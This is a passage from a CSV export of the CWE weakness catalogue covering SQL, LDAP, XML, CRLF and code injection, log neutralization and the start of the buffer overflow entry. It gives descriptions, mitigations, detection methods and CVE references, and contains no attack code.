in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not. In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::\",\"::REFERENCE:CVE-2023-32530:DESCRIPTION:SQL injection in security product dashboard using crafted certificate fields:LINK:https://www.cve.org/CVERecord?id=CVE-2023-32530::REFERENCE:CVE-2021-42258:DESCRIPTION:SQL injection in time and billing software, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-42258::REFERENCE:CVE-2021-27101:DESCRIPTION:SQL injection in file-transfer system via a crafted Host header, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-27101::REFERENCE:CVE-2020-12271:DESCRIPTION:SQL injection in firewall product's admin interface or user portal, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-12271::REFERENCE:CVE-2019-3792:DESCRIPTION:An automation system written in Go contains an API that is vulnerable to SQL injection allowing the attacker to read privileged data.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-3792::REFERENCE:CVE-2004-0366:DESCRIPTION:chain: SQL injection in library intended for database authentication allows SQL injection and authentication bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0366::REFERENCE:CVE-2008-2790:DESCRIPTION:SQL injection through an ID that was supposed to be numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2790::REFERENCE:CVE-2008-2223:DESCRIPTION:SQL injection through an ID that was supposed to be numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2223::REFERENCE:CVE-2007-6602:DESCRIPTION:SQL injection via user name.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-6602::REFERENCE:CVE-2008-5817:DESCRIPTION:SQL injection via user name or password fields.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5817::REFERENCE:CVE-2003-0377:DESCRIPTION:SQL injection in security product, using a crafted group name.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0377::REFERENCE:CVE-2008-2380:DESCRIPTION:SQL injection in authentication library.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2380::REFERENCE:CVE-2017-11508:DESCRIPTION:SQL injection in vulnerability management and reporting tool, using a crafted password.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-11508::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:SQL injection::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:SQL Injection::TAXONOMY NAME:CLASP:ENTRY NAME:SQL injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:19:ENTRY NAME:SQL Injection::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-89::TAXONOMY NAME:SEI CERT Oracle Coding Standard for Java:ENTRY ID:IDS00-J:ENTRY NAME:Prevent SQL injection:MAPPING FIT:Exact::\",::108::109::110::470::66::7::,\"::TYPE:Relationship:NOTE:SQL injection can be resultant from special character mismanagement, MAID, or denylist/allowlist problems. It can be primary to authentication errors.::\",\n90,\"Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')\",Base,Draft,\"The product constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.\",\"\",::NATURE:ChildOf:CWE ID:943:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:Database Server:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Read Application Data:IMPACT:Modify Application Data:NOTE:An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::\",\"::REFERENCE:CVE-2021-41232:DESCRIPTION:Chain: authentication routine in Go-based agile development product does not escape user name (CWE-116), allowing LDAP injection (CWE-90):LINK:https://www.cve.org/CVERecord?id=CVE-2021-41232::REFERENCE:CVE-2005-2301:DESCRIPTION:Server does not properly escape LDAP queries, which allows remote attackers to cause a DoS and possibly conduct an LDAP injection attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2301::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:LDAP injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:29:ENTRY NAME:LDAP Injection::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::136::,\"::TYPE:Relationship:NOTE:Factors: resultant to special character mismanagement, MAID, or denylist/allowlist problems. Can be primary to authentication and verification errors.::\",\n91,\"XML Injection (aka Blind XPath Injection)\",Base,Draft,\"The product does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.\",\"Within XML, special elements could include reserved words or characters such as <, >, , and &, which could then be used to add new data or modify XML syntax.\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:XML injection (aka Blind Xpath injection)::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:23:ENTRY NAME:XML Injection::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::250::83::,\"::TYPE:Maintenance:NOTE:The description for this entry is generally applicable to XML, but the name includes blind XPath injection which is more closely associated with CWE-643. Therefore this entry might need to be deprecated or converted to a general category - although injection into raw XML is not covered by CWE-643 or CWE-652.::TYPE:Theoretical:NOTE:In vulnerability theory terms, this is a representation-specific case of a Data/Directive Boundary Error.::TYPE:Research Gap:NOTE:Under-reported. This is likely found regularly by third party code auditors, but there are very few publicly reported examples.::\",\n93,\"Improper Neutralization of CRLF Sequences ('CRLF Injection')\",Base,Draft,\"The product uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs.\",\"\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:117:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Application Data::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Avoid using CRLF as a special sequence.::PHASE:Implementation:DESCRIPTION:Appropriately filter or quote CRLF sequences in user-controlled input.::\",\"::REFERENCE:CVE-2002-1771:DESCRIPTION:CRLF injection enables spam proxy (add mail headers) using email address or name.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1771::REFERENCE:CVE-2002-1783:DESCRIPTION:CRLF injection in API function arguments modify headers for outgoing requests.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1783::REFERENCE:CVE-2004-1513:DESCRIPTION:Spoofed entries in web server log file via carriage returns:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1513::REFERENCE:CVE-2006-4624:DESCRIPTION:Chain: inject fake log entries with fake timestamps using CRLF injection:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4624::REFERENCE:CVE-2005-1951:DESCRIPTION:Chain: Application accepts CRLF in an object ID, allowing HTTP response splitting.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1951::REFERENCE:CVE-2004-1687:DESCRIPTION:Chain: HTTP response splitting via CRLF in parameter related to URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1687::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:CRLF Injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:24:ENTRY NAME:HTTP Request Splitting::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::15::81::,\"\",\n94,\"Improper Control of Generation of Code ('Code Injection')\",Base,Draft,\"The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.\",\"When a product allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the product. Such an alteration could lead to arbitrary code execution. Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:913:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Interpreted:LANGUAGE PREVALENCE:Sometimes::TECHNOLOGY NAME:AI/ML:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:In some cases, injectable code controls authentication; this may lead to a remote vulnerability.::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:Injected code can access resources that the attacker is directly prevented from accessing.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:Often the actions performed by injected control code are unlogged.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Refactor your program so that you do not have to dynamically generate code.::PHASE:Architecture and Design:DESCRIPTION:Run your code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your product. Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. To reduce the likelihood of code injection, use stringent allowlists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().::PHASE:Testing:DESCRIPTION:Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.::PHASE:Testing:DESCRIPTION:Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.::PHASE:Operation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Implementation:DESCRIPTION:For Python programs, it is frequently encouraged to use the ast.literal_eval() function instead of eval, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].:EFFECTIVENESS:Discouraged Common Practice::\",\"::REFERENCE:CVE-2023-29374:DESCRIPTION:Math component in an LLM framework translates user input into a Python expression that is input into the Python exec() method, allowing code execution - one variant of a prompt injection attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2023-29374::REFERENCE:CVE-2024-5565:DESCRIPTION:Python-based library uses an LLM prompt containing user input to dynamically generate code that is then fed as input into the Python exec() method, allowing code execution - one variant of a prompt injection attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-5565::REFERENCE:CVE-2024-4181:DESCRIPTION:Framework for LLM applications allows eval injection via a crafted response from a hosting provider.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-4181::REFERENCE:CVE-2022-2054:DESCRIPTION:Python compiler uses eval() to execute malicious strings as Python code.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-2054::REFERENCE:CVE-2021-22204:DESCRIPTION:Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-22204::REFERENCE:CVE-2020-8218:DESCRIPTION:Code injection in VPN product, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8218::REFERENCE:CVE-2008-5071:DESCRIPTION:Eval injection in PHP program.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5071::REFERENCE:CVE-2002-1750:DESCRIPTION:Eval injection in Perl program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1750::REFERENCE:CVE-2008-5305:DESCRIPTION:Eval injection in Perl program using an ID that should only contain hyphens and numbers.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5305::REFERENCE:CVE-2002-1752:DESCRIPTION:Direct code injection into Perl eval function.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1752::REFERENCE:CVE-2002-1753:DESCRIPTION:Eval injection in Perl program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1753::REFERENCE:CVE-2005-1527:DESCRIPTION:Direct code injection into Perl eval function.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1527::REFERENCE:CVE-2005-2837:DESCRIPTION:Direct code injection into Perl eval function.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2837::REFERENCE:CVE-2005-1921:DESCRIPTION:MFV. code injection into PHP eval statement using nested constructs that should not be nested.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1921::REFERENCE:CVE-2005-2498:DESCRIPTION:MFV. code injection into PHP eval statement using nested constructs that should not be nested.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2498::REFERENCE:CVE-2005-3302:DESCRIPTION:Code injection into Python eval statement from a field in a formatted file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3302::REFERENCE:CVE-2007-1253:DESCRIPTION:Eval injection in Python program.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1253::REFERENCE:CVE-2001-1471:DESCRIPTION:chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1471::REFERENCE:CVE-2002-0495:DESCRIPTION:Perl code directly injected into CGI library file from parameters to another CGI program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0495::REFERENCE:CVE-2005-1876:DESCRIPTION:Direct PHP code injection into supporting template file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1876::REFERENCE:CVE-2005-1894:DESCRIPTION:Direct code injection into PHP script that can be accessed by attacker.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1894::REFERENCE:CVE-2003-0395:DESCRIPTION:PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0395::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY ID:CODE:ENTRY NAME:Code Evaluation and Injection::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 3.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 3.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-3::\",::242::35::77::,\"\",\n112,\"Missing XML Validation\",Base,Draft,\"The product accepts XML from an untrusted source but does not validate the XML against the proper schema.\",\"Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input.\",::NATURE:ChildOf:CWE ID:1286:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Always validate XML input against a known XML Schema or DTD. It is not possible for an XML parser to validate all aspects of a document's content because a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Missing XML Validation::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::230::231::,\"\",\n115,\"Misinterpretation of Input\",Base,Incomplete,\"The product misinterprets an input, whether from an attacker or another product, in a security-relevant fashion.\",\"\",::NATURE:ChildOf:CWE ID:436:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2005-2225:DESCRIPTION:Product sees dangerous file extension in free text of a group discussion, disconnects all users.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2225::REFERENCE:CVE-2001-0003:DESCRIPTION:Product does not correctly import and process security settings from another product.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0003::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Misinterpretation Error::\",,\"::TYPE:Research Gap:NOTE:This concept needs further study. It is likely a factor in several weaknesses, possibly resultant as well. Overlaps Multiple Interpretation Errors (MIE).::\",\n117,\"Improper Output Neutralization for Logs\",Base,Draft,\"The product does not neutralize or incorrectly neutralizes output that is written to logs.\",\"This can allow an attacker to forge log entries or inject malicious content into logs. Log forging vulnerabilities occur when: Data enters an application from an untrusted source. The data is written to an application or system log file.\",::NATURE:ChildOf:CWE ID:116:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"::Applications typically use log files to store a history of events or transactions for later review, statistics gathering, or debugging. Depending on the nature of the application, the task of reviewing log files may be performed manually on an as-needed basis or automated with a tool that automatically culls logs for important events or trending information.::\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Non-Repudiation:IMPACT:Modify Application Data:IMPACT:Hide Activities:IMPACT:Execute Unauthorized Code or Commands:NOTE:Interpretation of the log files may be hindered or misdirected if an attacker can supply data to the application that is subsequently logged verbatim. In the most benign case, an attacker may be able to insert false entries into the log file by providing the application with input that includes appropriate characters. Forged or otherwise corrupted log files can be used to cover an attacker's tracks, possibly by skewing statistics, or even to implicate another party in the commission of a malicious act. If the log file is processed automatically, the attacker can render the file unusable by corrupting the format of the file or injecting unexpected characters. An attacker may inject code or other commands into the log file and take advantage of a vulnerability in the log processing utility.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2006-4624:DESCRIPTION:Chain: inject fake log entries with fake timestamps using CRLF injection:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4624::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Log Forging::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS03-J:ENTRY NAME:Do not log unsanitized user input:MAPPING FIT:Exact::TAXONOMY NAME:SEI CERT Oracle Coding Standard for Java:ENTRY ID:IDS03-J:ENTRY NAME:Do not log unsanitized user input:MAPPING FIT:Exact::\",::268::81::93::,\"\",\n120,\"Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\",Base,Incomplete,\"The product copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow.\",\"A buffer overflow condition exists when a product attempts to put more data in a buffer than it can hold, or when it attempts to put data in a memory area outside of the boundaries of a buffer. The simplest type of error, and the most common cause of buffer overflows, is the classic case in which the product copies the buffer without restricting how much is copied. Other variants exist, but the existence of a classic overflow strongly suggests that the programmer is not considering even the most basic of security protections.\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW 